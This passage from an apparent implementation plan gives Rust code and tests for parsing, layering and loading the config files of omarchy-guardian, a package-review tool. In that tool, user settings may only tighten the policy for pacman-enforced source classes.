}

#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct AgentDefaults {
    pub model: Option<String>,
    pub max_input_kib: Option<u32>,
    /// Portable thinking level to provider variant name.
    pub variants: Vec<(Thinking, String)>,
}

#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct PartialConfig {
    pub profile: Option<Profile>,
    pub official_repos: Option<Vec<String>>,
    pub agent: AgentDefaults,
    pub classes: Vec<(SourceClass, PartialPolicy)>,
}

impl PartialConfig {
    /// The explicit values for one class (empty when the file has none).
    pub fn class(&self, class: SourceClass) -> PartialPolicy {
        self.classes
            .iter()
            .find(|(candidate, _)| *candidate == class)
            .map(|(_, policy)| policy.clone())
            .unwrap_or_default()
    }

    fn class_mut(&mut self, class: SourceClass) -> &mut PartialPolicy {
        let index = match self.classes.iter().position(|(candidate, _)| *candidate == class) {
            Some(index) => index,
            None => {
                self.classes.push((class, PartialPolicy::default()));
                self.classes.len() - 1
            }
        };
        &mut self.classes[index].1
    }
}

pub fn parse(file: &Path, text: &str) -> Result<PartialConfig, ConfigError> {
    let entries = tomlish::entries(text).map_err(|error| ConfigError {
        file: file.to_path_buf(),
        line: error.line(),
        key: String::new(),
        message: error.to_string(),
    })?;

    let mut config = PartialConfig::default();
    let mut seen: Vec<String> = Vec::new();

    for entry in &entries {
        let path = entry.full_path();
        let key = path.join(".");
        let field = Field {
            file,
            entry,
            key: &key,
        };

        if entry.array_table {
            return Err(field.error("array tables are not used in the config"));
        }
        if seen.contains(&key) {
            return Err(field.error("set more than once"));
        }
        seen.push(key.clone());

        let value = tomlish::typed_value(&entry.value)
            .ok_or_else(|| field.error("unsupported value (use a string, integer, boolean or list of strings)"))?;
        apply(&mut config, &path, &field, value)?;
    }
    Ok(config)
}

fn apply(
    config: &mut PartialConfig,
    path: &[&str],
    field: &Field<'_>,
    value: Value,
) -> Result<(), ConfigError> {
    match path {
        ["profile"] => config.profile = Some(field.named(value)?),
        ["official_repos"] => config.official_repos = Some(field.repo_list(value)?),
        ["agent", "model"] => config.agent.model = Some(field.model(value)?),
        ["agent", "max_input_kib"] => {
            config.agent.max_input_kib = Some(field.integer(value, &INPUT_KIB_RANGE)?);
        }
        ["agent", "variants", level] => {
            let level = Thinking::parse(level)
                .filter(|level| *level != Thinking::Default)
                .ok_or_else(|| field.error("variants map minimal, low, medium, high or max"))?;
            config.agent.variants.push((level, field.text(value)?));
        }
        ["class", name, knob] => {
            let class = SourceClass::parse(name).ok_or_else(|| {
                field.error(&format!("unknown source class (known: {})", names::<SourceClass>()))
            })?;
            apply_knob(config.class_mut(class), class, knob, field, value)?;
        }
        _ => return Err(field.error("unknown key")),
    }
    Ok(())
}

fn apply_knob(
    policy: &mut PartialPolicy,
    class: SourceClass,
    knob: &str,
    field: &Field<'_>,
    value: Value,
) -> Result<(), ConfigError> {
    match knob {
        "ai" => policy.ai = Some(field.named(value)?),
        "on_findings" => policy.on_findings = Some(field.named(value)?),
        "on_ai_suspicious" => policy.on_ai_suspicious = Some(field.named(value)?),
        "thinking" => policy.thinking = Some(field.named(value)?),
        "model" => policy.model = Some(field.model(value)?),
        "timeout_secs" => policy.timeout_secs = Some(field.integer(value, &TIMEOUT_RANGE)?),
        "confirm" if class.is_privileged() => {
            return Err(field.error("confirm is not available for classes enforced by the pacman hook"));
        }
        "confirm" => policy.confirm = Some(field.boolean(value)?),
        _ => return Err(field.error("unknown key")),
    }
    Ok(())
}

fn names<T: Named>() -> String {
    T::ALL
        .iter()
        .map(|value| value.name())
        .collect::<Vec<_>>()
        .join(", ")
}

/// One entry being interpreted, for error construction.
struct Field<'a> {
    file: &'a Path,
    entry: &'a Entry,
    key: &'a str,
}

impl Field<'_> {
    fn error(&self, message: &str) -> ConfigError {
        ConfigError {
            file: self.file.to_path_buf(),
            line: self.entry.line,
            key: self.key.to_string(),
            message: message.to_string(),
        }
    }

    fn text(&self, value: Value) -> Result<String, ConfigError> {
        match value {
            Value::String(text) if !text.trim().is_empty() => Ok(text),
            Value::String(_) | Value::Integer(_) | Value::Bool(_) | Value::StringArray(_) => {
                Err(self.error("expected a non-empty string"))
            }
        }
    }

    fn named<T: Named>(&self, value: Value) -> Result<T, ConfigError> {
        let text = self.text(value)?;
        T::parse(&text).ok_or_else(|| self.error(&format!("expected one of: {}", names::<T>())))
    }

    fn model(&self, value: Value) -> Result<String, ConfigError> {
        let text = self.text(value)?;
        let valid = text
            .split_once('/')
            .is_some_and(|(provider, model)| !provider.is_empty() && !model.is_empty())
            && !text.contains(char::is_whitespace);
        if valid {
            Ok(text)
        } else {
            Err(self.error("expected provider/model"))
        }
    }

    fn integer(&self, value: Value, range: &RangeInclusive<u32>) -> Result<u32, ConfigError> {
        let out_of_range = || {
            self.error(&format!(
                "expected an integer from {} to {}",
                range.start(),
                range.end()
            ))
        };
        match value {
            Value::Integer(number) => u32::try_from(number)
                .ok()
                .filter(|number| range.contains(number))
                .ok_or_else(out_of_range),
            Value::String(_) | Value::Bool(_) | Value::StringArray(_) => Err(out_of_range()),
        }
    }

    fn boolean(&self, value: Value) -> Result<bool, ConfigError> {
        match value {
            Value::Bool(flag) => Ok(flag),
            Value::String(_) | Value::Integer(_) | Value::StringArray(_) => {
                Err(self.error("expected true or false"))
            }
        }
    }

    fn repo_list(&self, value: Value) -> Result<Vec<String>, ConfigError> {
        let is_repo_name = |name: &str| {
            !name.is_empty()
                && name
                    .chars()
                    .all(|character| character.is_ascii_alphanumeric() || "._-".contains(character))
        };
        match value {
            Value::StringArray(names) if names.iter().all(|name| is_repo_name(name)) => Ok(names),
            Value::StringArray(_) | Value::String(_) | Value::Integer(_) | Value::Bool(_) => {
                Err(self.error("expected a list of pacman repository names"))
            }
        }
    }
}
```

Note: the case `("[[class]]\nai = \"off\"\n", 2, "class.ai")` produces key `class.ai` because the entry's table is `["class"]` and it is rejected by the `array_table` check.

- [ ] **Step 4: Run tests**

Run: `cargo test config::file`
Expected: 4 passed.

- [ ] **Step 5: Verify and commit**

Run: `cargo fmt --all && cargo clippy --all-targets -- -D warnings && cargo test`

```bash
git add src/config
git commit -m "Parse Guardian config files strictly

Every allowed key from the settings spec, typed and range-checked.
Unknown keys, duplicates and confirm on pacman-enforced classes are
errors that name the file, line and key."
```

---

### Task 5: Layer resolution with tighten-only privileged classes

**Files:**
- Create: `src/config/resolve.rs`
- Modify: `src/config/mod.rs` (`pub mod resolve;`)

**Interfaces:**
- Consumes: `model::{builtin, Named, Policy, Profile, SourceClass, Thinking, AiRequirement, Action}`, `file::PartialPolicy`.
- Produces:
  - `pub enum Origin { Profile, System, User }` with `pub const fn name(self) -> &'static str`
  - `pub struct Layers<'a> { pub system_profile: Profile, pub system: &'a PartialPolicy, pub user_profile: Option<Profile>, pub user: &'a PartialPolicy }`
  - `pub struct Resolved { pub policy: Policy, pub origins: Vec<(&'static str, Origin)>, pub ignored: Vec<String> }` with `pub fn origin(&self, knob: &str) -> Origin`
  - `pub fn resolve(class: SourceClass, layers: &Layers<'_>) -> Resolved`
  - `pub const KNOBS: [&str; 7] = ["ai", "on_findings", "on_ai_suspicious", "thinking", "model", "timeout_secs", "confirm"];`

- [ ] **Step 1: Write failing tests**

```rust
#[cfg(test)]
mod tests {
    use super::{Layers, Origin, resolve};
    use crate::config::file::PartialPolicy;
    use crate::config::model::{
        Action, AiRequirement, Named, Profile, SourceClass, Thinking, builtin,
    };

    fn layers<'a>(
        system_profile: Profile,
        system: &'a PartialPolicy,
        user_profile: Option<Profile>,
        user: &'a PartialPolicy,
    ) -> Layers<'a> {
        Layers {
            system_profile,
            system,
            user_profile,
            user,
        }
    }

    #[test]
    fn user_level_classes_take_user_values() {
        let system = PartialPolicy {
            thinking: Some(Thinking::Medium),
            ..PartialPolicy::default()
        };
        let user = PartialPolicy {
            ai: Some(AiRequirement::Off),
            model: Some("ollama/qwen3".into()),
            ..PartialPolicy::default()
        };

        let resolved = resolve(
            SourceClass::Theme,
            &layers(Profile::Standard, &system, Some(Profile::Strict), &user),
        );

        assert_eq!(resolved.policy.ai, AiRequirement::Off);
        assert_eq!(resolved.policy.thinking, Thinking::Medium);
        assert_eq!(resolved.policy.on_findings, Action::Block);
        assert_eq!(resolved.policy.model.as_deref(), Some("ollama/qwen3"));
        assert_eq!(resolved.origin("ai"), Origin::User);
        assert_eq!(resolved.origin("thinking"), Origin::System);
        assert_eq!(resolved.origin("on_findings"), Origin::Profile);
        assert!(resolved.ignored.is_empty());
    }

    #[test]
    fn user_cannot_loosen_privileged_classes() {
        let empty = PartialPolicy::default();
        let user = PartialPolicy {
            ai: Some(AiRequirement::Off),
            on_findings: Some(Action::Block),
            thinking: Some(Thinking::Minimal),
            model: Some("evil/model".into()),
            timeout_secs: Some(900),
            ..PartialPolicy::default()
        };

        let resolved = resolve(
            SourceClass::Official,
            &layers(Profile::Standard, &empty, None, &user),
        );

        assert_eq!(resolved.policy.ai, AiRequirement::Optional);
        assert_eq!(resolved.policy.on_findings, Action::Block);
        assert_eq!(resolved.policy.thinking, Thinking::Low);
        assert_eq!(resolved.policy.model, None);
        assert_eq!(resolved.policy.timeout_secs, None);
        assert_eq!(resolved.origin("on_findings"), Origin::User);
        assert_eq!(resolved.ignored.len(), 4, "{:?}", resolved.ignored);
        assert!(resolved.ignored.iter().any(|line| line.starts_with("ai = off")));
    }

    #[test]
    fn a_stricter_user_profile_tightens_privileged_classes() {
        let empty = PartialPolicy::default();
        let resolved = resolve(
            SourceClass::Official,
            &layers(Profile::Standard, &empty, Some(Profile::Strict), &empty),
        );
        assert_eq!(resolved.policy, builtin(Profile::Strict, SourceClass::Official));

        let looser = resolve(
            SourceClass::Official,
            &layers(Profile::Strict, &empty, Some(Profile::LocalOnly), &empty),
        );
        assert_eq!(looser.policy, builtin(Profile::Strict, SourceClass::Official));
        assert!(!looser.ignored.is_empty());
    }

    /// Spec §6: for privileged classes the result is never looser than the
    /// system layer, for every knob and every value pair.
    #[test]
    fn tighten_only_is_exhaustive() {
        let privileged = SourceClass::ALL.iter().copied().filter(|class| class.is_privileged());

        for class in privileged {
            for system_profile in Profile::ALL.iter().copied() {
                for &system_ai in AiRequirement::ALL {
                    for &user_ai in AiRequirement::ALL {
                        for &system_action in Action::ALL {
                            for &user_action in Action::ALL {
                                for &system_thinking in Thinking::ALL {
                                    for &user_thinking in Thinking::ALL {
                                        let system = PartialPolicy {
                                            ai: Some(system_ai),
                                            on_findings: Some(system_action),
                                            on_ai_suspicious: Some(system_action),
                                            thinking: Some(system_thinking),
                                            ..PartialPolicy::default()
                                        };
                                        let user = PartialPolicy {
                                            ai: Some(user_ai),
                                            on_findings: Some(user_action),
                                            on_ai_suspicious: Some(user_action),
                                            thinking: Some(user_thinking),
                                            ..PartialPolicy::default()
                                        };
                                        let policy = resolve(
                                            class,
                                            &layers(system_profile, &system, None, &user),
                                        )
                                        .policy;

                                        assert_eq!(policy.ai, system_ai.max(user_ai));
                                        assert_eq!(policy.on_findings, system_action.max(user_action));
                                        assert_eq!(
                                            policy.on_ai_suspicious,
                                            system_action.max(user_action)
                                        );
                                        assert_eq!(policy.thinking, system_thinking.max(user_thinking));
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
```

Add `pub mod resolve;` to `src/config/mod.rs`.

- [ ] **Step 2: Run to verify failure**

Run: `cargo test config::resolve`
Expected: compile errors.

- [ ] **Step 3: Implement**

Prepend to `src/config/resolve.rs`:

```rust
//! Combining profile, system file and user file into one policy per class
//! (spec §6). For classes enforced by the root pacman hook the user layer
//! may only tighten; everything it cannot apply is recorded, never dropped
//! silently.

use crate::config::file::PartialPolicy;
use crate::config::model::{Named, Policy, Profile, SourceClass, builtin};

pub const KNOBS: [&str; 7] = [
    "ai",
    "on_findings",
    "on_ai_suspicious",
    "thinking",
    "model",
    "timeout_secs",
    "confirm",
];

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Origin {
    Profile,
    System,
    User,
}

impl Origin {
    pub const fn name(self) -> &'static str {
        match self {
            Self::Profile => "profile",
            Self::System => "system",
            Self::User => "user",
        }
    }
}

pub struct Layers<'a> {
    pub system_profile: Profile,
    pub system: &'a PartialPolicy,
    pub user_profile: Option<Profile>,
    pub user: &'a PartialPolicy,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Resolved {
    pub policy: Policy,
    pub origins: Vec<(&'static str, Origin)>,
    /// User values that were not applied, with the reason.
    pub ignored: Vec<String>,
}

impl Resolved {
    pub fn origin(&self, knob: &str) -> Origin {
        self.origins
            .iter()
            .find(|(name, _)| *name == knob)
            .map_or(Origin::Profile, |(_, origin)| *origin)
    }

    fn from_profile(profile: Profile, class: SourceClass) -> Self {
        Self {
            policy: builtin(profile, class),
            origins: KNOBS.iter().map(|knob| (*knob, Origin::Profile)).collect(),
            ignored: Vec::new(),
        }
    }

    fn mark(&mut self, knob: &'static str, origin: Origin) {
        if let Some(entry) = self.origins.iter_mut().find(|(name, _)| *name == knob) {
            entry.1 = origin;
        }
    }

    /// Unconditional override (system layer, or user layer for user-level classes).
    fn apply(&mut self, values: &PartialPolicy, origin: Origin) {
        if let Some(ai) = values.ai {
            self.policy.ai = ai;
            self.mark("ai", origin);
        }
        if let Some(action) = values.on_findings {
            self.policy.on_findings = action;
            self.mark("on_findings", origin);
        }
        if let Some(action) = values.on_ai_suspicious {
            self.policy.on_ai_suspicious = action;
            self.mark("on_ai_suspicious", origin);
        }
        if let Some(thinking) = values.thinking {
            self.policy.thinking = thinking;
            self.mark("thinking", origin);
        }
        if let Some(model) = &values.model {
            self.policy.model = Some(model.clone());
            self.mark("model", origin);
        }
        if let Some(timeout) = values.timeout_secs {
            self.policy.timeout_secs = Some(timeout);
            self.mark("timeout_secs", origin);
        }
        if let Some(confirm) = values.confirm {
            self.policy.confirm = confirm;
            self.mark("confirm", origin);
        }
    }

    /// Tighten-only override for privileged classes.
    fn tighten(&mut self, values: &PartialPolicy, source: &str) {
        tighten_knob(
            &mut self.policy.ai,
            values.ai,
            "ai",
            source,
            &mut self.origins,
            &mut self.ignored,
        );
        tighten_knob(
            &mut self.policy.on_findings,
            values.on_findings,
            "on_findings",
            source,
            &mut self.origins,
            &mut self.ignored,
        );
        tighten_knob(
            &mut self.policy.on_ai_suspicious,
            values.on_ai_suspicious,
            "on_ai_suspicious",
            source,
            &mut self.origins,
            &mut self.ignored,
        );
        tighten_knob(
            &mut self.policy.thinking,
            values.thinking,
            "thinking",
            source,
            &mut self.origins,
            &mut self.ignored,
        );

        if let Some(model) = &values.model {
            self.ignored.push(format!(
                "model = {model} ignored ({source}): models for pacman-enforced classes come only from the system file"
            ));
        }
        if let Some(timeout) = values.timeout_secs {
            self.ignored.push(format!(
                "timeout_secs = {timeout} ignored ({source}): only the system file sets it for pacman-enforced classes"
            ));
        }
    }
}

fn tighten_knob<T: Named + Ord>(
    slot: &mut T,
    candidate: Option<T>,
    knob: &'static str,
    source: &str,
    origins: &mut [(&'static str, Origin)],
    ignored: &mut Vec<String>,
) {
    let Some(candidate) = candidate else {
        return;
    };
    if candidate < *slot {
        ignored.push(format!(
            "{knob} = {} ignored ({source}): looser than {} for a pacman-enforced class",
            candidate.name(),
            slot.name()
        ));
        return;
    }
    if candidate > *slot {
        *slot = candidate;
        if let Some(entry) = origins.iter_mut().find(|(name, _)| *name == knob) {
            entry.1 = Origin::User;
        }
    }
}

pub fn resolve(class: SourceClass, layers: &Layers<'_>) -> Resolved {
    if class.is_privileged() {
        let mut resolved = Resolved::from_profile(layers.system_profile, class);
        resolved.apply(layers.system, Origin::System);

        if let Some(profile) = layers.user_profile {
            let profile_values = as_partial(&builtin(profile, class));
            resolved.tighten(&profile_values, &format!("user profile {}", profile.name()));
        }
        resolved.tighten(layers.user, "user file");
        resolved
    } else {
        let profile = layers.user_profile.unwrap_or(layers.system_profile);
        let mut resolved = Resolved::from_profile(profile, class);
        resolved.apply(layers.system, Origin::System);
        resolved.apply(layers.user, Origin::User);
        resolved
    }
}

/// A built-in policy's tightenable knobs as explicit values.
fn as_partial(policy: &Policy) -> PartialPolicy {
    PartialPolicy {
        ai: Some(policy.ai),
        on_findings: Some(policy.on_findings),
        on_ai_suspicious: Some(policy.on_ai_suspicious),
        thinking: Some(policy.thinking),
        model: None,
        timeout_secs: None,
        confirm: None,
    }
}
```

Note: in `a_stricter_user_profile_tightens_privileged_classes`, the looser `local-only` profile produces ignored lines for `ai`, `on_findings` and `thinking`, which is what the test asserts.

- [ ] **Step 4: Run tests**

Run: `cargo test config::resolve`
Expected: 4 passed (the exhaustive test covers 3 × 3 × 3 × 3 × 2 × 2 × 6 × 6 cases per privileged class).

- [ ] **Step 5: Verify and commit**

Run: `cargo fmt --all && cargo clippy --all-targets -- -D warnings && cargo test`

```bash
git add src/config
git commit -m "Resolve settings with a tighten-only user layer

Profile, system file and user file merge per class. For classes the
root pacman hook enforces, user values may only tighten and models or
timeouts are never taken from the user; every refused value is kept so
config show can explain it. An exhaustive test pins the rule."
```

---

### Task 6: Loading settings from disk

**Files:**
- Create: `src/config/load.rs`
- Modify: `src/config/mod.rs` (`pub mod load;` and `pub use load::Settings;`)

**Interfaces:**
- Consumes: `file::{parse, PartialConfig, AgentDefaults}`, `resolve::{resolve, Layers, Resolved}`, `model::{AgentSettings, Named, Policy, Profile, SourceClass, Thinking, DEFAULT_MAX_INPUT_KIB}`.
- Produces:
  - `pub const SYSTEM_PATH: &str = "/etc/omarchy-guardian/config.toml";`
  - `pub const DEFAULT_OFFICIAL_REPOS: [&str; 7]`
  - `pub enum FileStatus { Missing, Loaded, Invalid(String) }`
  - `pub struct Settings` with:
    - `pub fn load() -> Self`
    - `pub fn load_from(system: &Path, user: Option<&Path>, secure: &dyn Fn(&Path) -> Result<(), String>) -> Self`
    - `pub fn from_parts(system: PartialConfig, user: PartialConfig) -> Self` (tests and wizard validation)
    - `pub fn with_profile(self, profile: Profile) -> Self`
    - `pub fn system_profile(&self) -> Profile`
    - `pub fn profile_for(&self, class: SourceClass) -> Profile`
    - `pub fn resolve(&self, class: SourceClass) -> Resolved`
    - `pub fn policy(&self, class: SourceClass) -> Policy`
    - `pub fn agent_settings(&self, class: SourceClass) -> AgentSettings`
    - `pub fn official_repos(&self) -> Vec<String>`
    - `pub fn privileged_block(&self) -> Option<&str>`
    - `pub fn warnings(&self) -> &[String]`
    - `pub fn system_status(&self) -> &FileStatus`, `pub fn user_status(&self) -> &FileStatus`
    - `pub fn system_path(&self) -> &Path`, `pub fn user_path(&self) -> Option<&Path>`
  - `pub fn user_config_path() -> Option<PathBuf>`
  - `pub fn check_root_owned(path: &Path) -> Result<(), String>`

- [ ] **Step 1: Write failing tests**

```rust
#[cfg(test)]
mod tests {
    use std::fs;
    use std::path::Path;

    use super::{FileStatus, Settings};
    use crate::config::file::{AgentDefaults, PartialConfig, PartialPolicy};
    use crate::config::model::{AiRequirement, Profile, SourceClass, Thinking};
    use crate::test_support::TempDir;

    fn secure(_: &Path) -> Result<(), String> {
        Ok(())
    }

    fn insecure(_: &Path) -> Result<(), String> {
        Err("owned by uid 1000".into())
    }

    #[test]
    fn missing_files_mean_the_standard_profile() {
        let dir = TempDir::new("settings-missing");
        let settings = Settings::load_from(
            &dir.path().join("system.toml"),
            Some(&dir.path().join("user.toml")),
            &secure,
        );

        assert_eq!(settings.system_status(), &FileStatus::Missing);
        assert_eq!(settings.privileged_block(), None);
        assert_eq!(settings.policy(SourceClass::Official).ai, AiRequirement::Optional);
        assert_eq!(settings.policy(SourceClass::Aur).ai, AiRequirement::Required);
    }

    #[test]
    fn insecure_or_invalid_system_file_blocks_privileged_classes() {
        let dir = TempDir::new("settings-insecure");
        let system = dir.path().join("system.toml");
        fs::write(&system, "profile = \"local-only\"\n").unwrap();

        let settings = Settings::load_from(&system, None, &insecure);
        assert!(settings.privileged_block().unwrap().contains("owned by uid 1000"));
        assert!(matches!(settings.system_status(), FileStatus::Invalid(_)));
        // User-level classes fall back to the built-in standard profile.
        assert_eq!(settings.policy(SourceClass::Theme).ai, AiRequirement::Required);

        fs::write(&system, "profile = \"bogus\"\n").unwrap();
        let settings = Settings::load_from(&system, None, &secure);
        assert!(settings.privileged_block().unwrap().contains("config check"));
    }

    #[test]
    fn an_invalid_user_file_is_ignored_with_a_warning() {
        let dir = TempDir::new("settings-user");
        let user = dir.path().join("user.toml");
        fs::write(&user, "[class.aur]\nai = \"sometimes\"\n").unwrap();

        let settings = Settings::load_from(&dir.path().join("none.toml"), Some(&user), &secure);
        assert!(matches!(settings.user_status(), FileStatus::Invalid(_)));
        assert_eq!(settings.warnings().len(), 1);
        assert_eq!(settings.policy(SourceClass::Aur).ai, AiRequirement::Required);
    }

    #[test]
    fn agent_settings_follow_layers_and_privilege() {
        let system = PartialConfig {
            agent: AgentDefaults {
                model: Some("anthropic/claude-sonnet-5".into()),
                max_input_kib: Some(512),
                variants: vec![(Thinking::Max, "xhigh".into())],
            },
            ..PartialConfig::default()
        };
        let user = PartialConfig {
            agent: AgentDefaults {
                model: Some("ollama/qwen3".into()),
                max_input_kib: None,
                variants: vec![(Thinking::High, "deep".into())],
            },
            classes: vec![(
                SourceClass::Aur,
                PartialPolicy {
                    thinking: Some(Thinking::Max),
                    ..PartialPolicy::default()
                },
            )],
            ..PartialConfig::default()
        };
        let settings = Settings::from_parts(system, user);

        let official = settings.agent_settings(SourceClass::Official);
        assert_eq!(official.model.as_deref(), Some("anthropic/claude-sonnet-5"));
        assert_eq!(official.variant.as_deref(), Some("low"));
        assert_eq!(official.max_input_bytes, 512 * 1024);

        let aur = settings.agent_settings(SourceClass::Aur);
        assert_eq!(aur.model.as_deref(), Some("ollama/qwen3"));
        assert_eq!(aur.variant.as_deref(), Some("xhigh"));
        assert_eq!(aur.timeout_secs, 300);

        let theme = settings.agent_settings(SourceClass::Theme);
        assert_eq!(theme.variant.as_deref(), Some("deep"));
    }

    #[test]
    fn profile_override_applies_to_user_level_classes_only() {
        let settings = Settings::from_parts(PartialConfig::default(), PartialConfig::default())
            .with_profile(Profile::LocalOnly);
        assert_eq!(settings.policy(SourceClass::Source).ai, AiRequirement::Off);
        assert_eq!(settings.policy(SourceClass::Official).ai, AiRequirement::Optional);
        assert_eq!(settings.profile_for(SourceClass::Source), Profile::LocalOnly);
        assert_eq!(settings.profile_for(SourceClass::Official), Profile::Standard);
    }

    #[test]
    fn official_repos_default_and_override() {
        let settings = Settings::from_parts(PartialConfig::default(), PartialConfig::default());
        assert!(settings.official_repos().contains(&"omarchy".to_string()));

        let custom = PartialConfig {
            official_repos: Some(vec!["core".into()]),
            ..PartialConfig::default()
        };
        let user = PartialConfig {
            official_repos: Some(vec!["evil".into()]),
            ..PartialConfig::default()
        };
        assert_eq!(Settings::from_parts(custom, user).official_repos(), ["core"]);
    }
}
```

- [ ] **Step 2: Run to verify failure**

Run: `cargo test config::load`
Expected: compile errors.

- [ ] **Step 3: Implement**

Prepend to `src/config/load.rs`:

```rust
//! Locating, validating and combining the two config files into `Settings`.

use std::env;
use std::fs;
use std::io;
use std::os::unix::fs::MetadataExt;
use std::path::{Path, PathBuf};

use crate::config::file::{AgentDefaults, PartialConfig, parse};
use crate::config::model::{
    AgentSettings, DEFAULT_MAX_INPUT_KIB, Named, Policy, Profile, SourceClass, Thinking,
};
use crate::config::resolve::{Layers, Resolved, resolve};

pub const SYSTEM_PATH: &str = "/etc/omarchy-guardian/config.toml";

pub const DEFAULT_OFFICIAL_REPOS: [&str; 7] = [
    "core",
    "extra",
    "multilib",
    "core-testing",
    "extra-testing",
    "multilib-testing",
    "omarchy",
];

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum FileStatus {
    Missing,
    Loaded,
    Invalid(String),
}

#[derive(Clone, Debug)]
pub struct Settings {
    system_path: PathBuf,
    user_path: Option<PathBuf>,
    system: PartialConfig,
    user: PartialConfig,
    system_status: FileStatus,
    user_status: FileStatus,
    profile_override: Option<Profile>,
    privileged_block: Option<String>,
    warnings: Vec<String>,
}

/// `$XDG_CONFIG_HOME/omarchy-guardian/config.toml`, else `~/.config/...`.
pub fn user_config_path() -> Option<PathBuf> {
    let base = env::var_os("XDG_CONFIG_HOME")
        .map(PathBuf::from)
        .filter(|path| path.is_absolute())
        .or_else(|| {
            env::var_os("HOME")
                .map(PathBuf::from)
                .filter(|path| path.is_absolute())
                .map(|home| home.join(".config"))
        })?;
    Some(base.join("omarchy-guardian").join("config.toml"))
}

/// The system file and its directory must be root-owned regular entries
/// that only root can write.
pub fn check_root_owned(path: &Path) -> Result<(), String> {
    let metadata = fs::symlink_metadata(path).map_err(|error| error.to_string())?;
    if !metadata.file_type().is_file() {
        return Err("not a regular file".into());
    }
    let checks = [(path, metadata)].into_iter().chain(
        path.parent()
            .and_then(|parent| fs::metadata(parent).ok().map(|meta| (parent, meta))),
    );
    for (entry, metadata) in checks {
        if metadata.uid() != 0 {
            return Err(format!("{} is owned by uid {}, not root", entry.display(), metadata.uid()));
        }
        if metadata.mode() & 0o022 != 0 {
            return Err(format!("{} is writable by group or others", entry.display()));
        }
    }
    Ok(())
}

enum Read {
    Missing,
    Parsed(PartialConfig),
    Failed(String),
}

fn read(path: &Path, secure: Option<&dyn Fn(&Path) -> Result<(), String>>) -> Read {
    match fs::symlink_metadata(path) {
        Err(error) if error.kind() == io::ErrorKind::NotFound => return Read::Missing,
        Err(error) => return Read::Failed(error.to_string()),
        Ok(_) => {}
    }
    if let Some(secure) = secure
        && let Err(reason) = secure(path)
    {
        return Read::Failed(format!("insecure: {reason}"));
    }
    match fs::read_to_string(path) {
        Ok(text) => match parse(path, &text) {
            Ok(config) => Read::Parsed(config),
            Err(error) => Read::Failed(error.to_string()),
        },
        Err(error) => Read::Failed(error.to_string()),
    }
}

impl Settings {
    pub fn load() -> Self {
        Self::load_from(
            Path::new(SYSTEM_PATH),
            user_config_path().as_deref(),
            &check_root_owned,
        )
    }

    pub fn load_from(
        system_path: &Path,
        user_path: Option<&Path>,
        secure: &dyn Fn(&Path) -> Result<(), String>,
    ) -> Self {
        let mut settings = Self::from_parts(PartialConfig::default(), PartialConfig::default());
        settings.system_path = system_path.to_path_buf();
        settings.user_path = user_path.map(Path::to_path_buf);

        match read(system_path, Some(secure)) {
            Read::Missing => {}
            Read::Parsed(config) => {
                settings.system = config;
                settings.system_status = FileStatus::Loaded;
            }
            Read::Failed(reason) => {
                settings.privileged_block = Some(format!(
                    "{}: {reason}; fix it (see `omarchy-guardian config check`) before pacman transactions can be reviewed",
                    system_path.display()
                ));
                settings.warnings.push(format!(
                    "ignoring {}: {reason}",
                    system_path.display()
                ));
                settings.system_status = FileStatus::Invalid(reason);
            }
        }

        if let Some(user_path) = user_path {
            match read(user_path, None) {
                Read::Missing => {}
                Read::Parsed(config) => {
                    settings.user = config;
                    settings.user_status = FileStatus::Loaded;
                }
                Read::Failed(reason) => {
                    settings.warnings.push(format!("ignoring {}: {reason}", user_path.display()));
                    settings.user_status = FileStatus::Invalid(reason);
                }
            }
        }
        settings
    }

    pub fn from_parts(system: PartialConfig, user: PartialConfig) -> Self {
        Self {
            system_path: PathBuf::from(SYSTEM_PATH),
            user_path: None,
            system,
            user,
            system_status: FileStatus::Missing,
            user_status: FileStatus::Missing,
            profile_override: None,
            privileged_block: None,
            warnings: Vec::new(),
        }
    }

    /// A one-run profile for user-level classes (`--profile`).
    pub fn with_profile(mut self, profile: Profile) -> Self {
        self.profile_override = Some(profile);
        self
    }

    pub fn system_profile(&self) -> Profile {
        self.system.profile.unwrap_or(Profile::Standard)
    }

    fn user_profile(&self) -> Option<Profile> {
        self.profile_override.or(self.user.profile)
    }

    /// The profile whose built-ins a class starts from.
    pub fn profile_for(&self, class: SourceClass) -> Profile {
        if class.is_privileged() {
            self.system_profile()
        } else {
            self.user_profile().unwrap_or_else(|| self.system_profile())
        }
    }

    pub fn resolve(&self, class: SourceClass) -> Resolved {
        let system = self.system.class(class);
        let user = self.user.class(class);
        resolve(
            class,
            &Layers {
                system_profile: self.system_profile(),
                system: &system,
                user_profile: self.user_profile(),
                user: &user,
            },
        )
    }

    pub fn policy(&self, class: SourceClass) -> Policy {
        self.resolve(class).policy
    }

    /// Agent defaults that may influence a class: only the system file for
    /// pacman-enforced classes, the system then the user file otherwise.
    fn agent_layers(&self, class: SourceClass) -> Vec<&AgentDefaults> {
        if class.is_privileged() {
            vec![&self.system.agent]
        } else {
            vec![&self.system.agent, &self.user.agent]
        }
    }

    pub fn agent_settings(&self, class: SourceClass) -> AgentSettings {
        let policy = self.policy(class);
        let layers = self.agent_layers(class);

        let model = policy
            .model
            .clone()
            .or_else(|| layers.iter().rev().find_map(|layer| layer.model.clone()));
        let variant = (policy.thinking != Thinking::Default).then(|| {
            layers
                .iter()
                .rev()
                .find_map(|layer| {
                    layer
                        .variants
                        .iter()
                        .find(|(level, _)| *level == policy.thinking)
                        .map(|(_, name)| name.clone())
                })
                .unwrap_or_else(|| policy.thinking.name().to_string())
        });
        let max_input_kib = layers
            .iter()
            .rev()
            .find_map(|layer| layer.max_input_kib)
            .unwrap_or(DEFAULT_MAX_INPUT_KIB);

        AgentSettings {
            model,
            thinking: policy.thinking,
            variant,
            timeout_secs: policy.timeout_secs(),
            max_input_bytes: max_input_kib as usize * 1024,
        }
    }

    pub fn official_repos(&self) -> Vec<String> {
        self.system.official_repos.clone().unwrap_or_else(|| {
            DEFAULT_OFFICIAL_REPOS
                .iter()
                .map(ToString::to_string)
                .collect()
        })
    }

    pub fn privileged_block(&self) -> Option<&str> {
        self.privileged_block.as_deref()
    }

    pub fn warnings(&self) -> &[String] {
        &self.warnings
    }

    pub fn system_status(&self) -> &FileStatus {
        &self.system_status
    }

    pub fn user_status(&self) -> &FileStatus {
        &self.user_status
    }

